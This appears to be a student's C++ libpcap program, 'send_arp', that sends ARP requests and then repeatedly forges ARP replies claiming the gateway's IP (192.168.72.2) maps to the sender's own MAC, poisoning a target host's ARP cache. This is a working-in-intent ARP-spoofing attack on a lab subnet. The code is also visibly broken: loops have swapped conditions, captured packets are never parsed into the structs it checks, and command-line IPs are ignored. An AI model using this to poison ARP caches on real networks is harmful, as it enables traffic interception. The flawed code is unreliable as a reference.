#pragma pack(push, 1)

#include <iostream>
#include <pcap.h>
#include "mypcap.h"
#include <stdio.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>

// to get the MAC Address
#include "getmac.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <string.h>
#include <memory.h>

const unsigned short ETHERNET_HW_TYPE = htons(0x0001);
const unsigned short ETHERNET_PRO= htons(0x0800);
const unsigned short ARP_REQ= htons(0x0001);
const unsigned short ARP_REP= htons(0x0002);
//using namespace std;

struct arpHdr
  {
    unsigned short int ar_hrd;		/* Format of hardware address.  */
    unsigned short int ar_pro;		/* Format of protocol address.  */
    unsigned char ar_hln;		/* Length of hardware address.  */
    unsigned char ar_pln;		/* Length of protocol address.  */
    unsigned short int ar_op;		/* ARP opcode (command).  */
#if 1
    /* Ethernet looks like this : This bit is variable sized
       however...  */
    unsigned char __ar_sha[ETH_ALEN];	/* Sender hardware address.  */
    unsigned char __ar_sip[4];		/* Sender IP address.  */
    unsigned char __ar_tha[ETH_ALEN];	/* Target hardware address.  */
    unsigned char __ar_tip[4];		/* Target IP address.  */
#endif
  };

struct sendpacket{
    struct ether_header eth;
    struct arpHdr arp;

};



int main(int argc, char **argv)
{
    if(argc!=4){
           printf("usage : ./send_arp <interface> <sender_ip> <target_ip>");
           return -1;
    }

    char* dev = argv[1];
    //u_int32_t tgt_ip;

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }

    struct sendpacket sp;

    memset( sp.eth.ether_dhost,0xFF,sizeof(sp.eth.ether_dhost));
    ifreq *ifr;
    ifr = get_host_mac("ens33");
    memcpy(sp.eth.ether_shost,ifr->ifr_hwaddr.sa_data,sizeof(sp.eth.ether_shost));
    sp.eth.ether_type=htons(0x0806);


    memcpy(&sp.arp.ar_hrd,&ETHERNET_HW_TYPE,sizeof(sp.arp.ar_hrd));
    memcpy(&sp.arp.ar_pro,&ETHERNET_PRO,sizeof(sp.arp.ar_pro));
    memset(&sp.arp.ar_hln,0x06,sizeof(sp.arp.ar_hln));
    memset(&sp.arp.ar_pln,0x04,sizeof(sp.arp.ar_pln));
    memcpy(&sp.arp.ar_op,&ARP_REQ,sizeof(sp.arp.ar_op));



    memcpy(sp.arp.__ar_sha,ifr->ifr_hwaddr.sa_data,ETH_ALEN);
    u_int32_t sip = htonl(0xC0A8489E);                                          //192.168.72.158
    memcpy(sp.arp.__ar_sip, &sip,4);


    memset(sp.arp.__ar_tha,0x00,ETH_ALEN);
    u_int32_t dip = htonl(0XC0A84881);                                                         //192.168.72.129
    memcpy(sp.arp.__ar_tip, &dip,4);

    for(int i=0;i++;i<sizeof(sp.arp.__ar_tip)){
        //printf("%d :",sp.arp.__ar_tip[i]);
    }
    printf("===debug===\n");

    //int res=0;

     //res =  pcap_sendpacket(handle,(u_char*)&sp,52);

     if (pcap_sendpacket(handle,(u_char*)&sp, 42)  != 0)
         {
             fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
             return -1;
         }

     while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct ether_header sender_eth;
        struct arpHdr sender_arp;
        struct iphdr sender_ip;

        uint8_t sender_mac[ETH_ALEN];


        if(ntohs(sender_eth.ether_type)==0x0806){
            if(ntohs(sender_arp.ar_op==0x0002)){
                uint32_t sender_sip = ntohl(0XC0A84881);                              //192.168.72.129
                if(sender_ip.saddr==sender_sip){
                    memcpy(sender_mac ,sender_eth.ether_shost,sizeof(sender_mac));
                    for(int i=0;i++;i<sizeof(sender_mac)){
                        printf("%d :", sender_mac[i]);
                    }
                }

            }
        }

        struct sendpacket sp;

        memcpy( sp.eth.ether_dhost,sender_mac,sizeof(sp.eth.ether_dhost));

        ifreq *ifr;
        ifr = get_host_mac("ens33");
        memcpy(sp.eth.ether_shost,ifr->ifr_hwaddr.sa_data,sizeof(sp.eth.ether_shost));
        sp.eth.ether_type=htons(0x0806);


        memcpy(&sp.arp.ar_hrd,&ETHERNET_HW_TYPE,sizeof(sp.arp.ar_hrd));
        memcpy(&sp.arp.ar_pro,&ETHERNET_PRO,sizeof(sp.arp.ar_pro));
        memset(&sp.arp.ar_hln,0x06,sizeof(sp.arp.ar_hln));
        memset(&sp.arp.ar_pln,0x04,sizeof(sp.arp.ar_pln));
        memcpy(&sp.arp.ar_op,&ARP_REP,sizeof(sp.arp.ar_op));



        memcpy(sp.arp.__ar_sha,ifr->ifr_hwaddr.sa_data,ETH_ALEN);
        u_int32_t sip = htonl(0xC0A84802);                                          //gateway : 192.168.72.2
        memcpy(sp.arp.__ar_sip, &sip,4);


        memset(sp.arp.__ar_tha,0x00,ETH_ALEN);
        u_int32_t dip = htonl(0XC0A84881);                                                         //192.168.72.129
        memcpy(sp.arp.__ar_tip, &dip,4);

        printf("===debug===send2\n");

        //int res=0;

         //res =  pcap_sendpacket(handle,(u_char*)&sp,52);

         if (pcap_sendpacket(handle,(u_char*)&sp, 42)  != 0)
             {
                 fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
                 return -1;
             }





     }


}
